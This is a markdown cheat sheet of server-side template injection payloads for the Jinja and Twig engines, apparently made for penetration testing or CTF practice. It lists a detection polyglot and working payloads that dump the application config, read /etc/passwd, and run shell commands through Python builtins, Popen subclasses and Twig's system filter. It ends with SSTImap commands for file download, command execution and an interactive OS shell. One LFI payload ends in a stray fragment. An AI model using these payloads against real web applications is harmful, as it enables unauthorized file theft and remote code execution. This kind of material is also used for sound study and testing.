SSTI Injection tests  (Should result in an error):
```
${{<%[%'"}}%\.
```


![](ssti_test_flow.png)
77777 = Jinja
49 = Twig


### Jinja Template Engine
*Common in Flask and Django*

#### Payloads
Applicaiton configruration grabbing
```Jinja
{{ config.items() }}
```

Dump source code built-on functions
```Jinja
{{ self.__init__.__globals__.__builtins__ }}
```

LFI payload
```Jinja
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}__()}} 
```

Remote code execution using python
```Jinja
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

Enumerate available classes. May need to change the [1] value in intruder to find right index.
```Jinja
{{''.__class__.mro()[1].__subclasses__()}} 
```

To run the subclass RCE. Popen is a good class to use.
```Jinja
{{''.__class__.__mro__[1].__subclasses__()[396]('id', shell=True, stdout=-1).communicate()}}
```


### TWIG Template Engine
*Twig is a template engine for PHP* 

Limited information about itself
```Twig
{{ _self }}
```

LFI

```Twig
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```

```Twig
{{['cat${IFS}/flag.txt']|filter('system')}}
```


RCE
```Twig
{{ ['id'] | filter('system') }}
```

### Tools

#### SSTImap
```txt
# Popular ssti scanning tool.
https://github.com/vladko312/SSTImap

pip3 install -r requirements.txt
python3 sstimap.py 


# Identify SSTI vulnerability and Template Engine
python3 sstimap.py -u http://172.17.0.2/index.php?name=test

# Download remote file to local machine with -D
python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'


# Execute system command with -S
python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id

# Interactive shell
python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell

```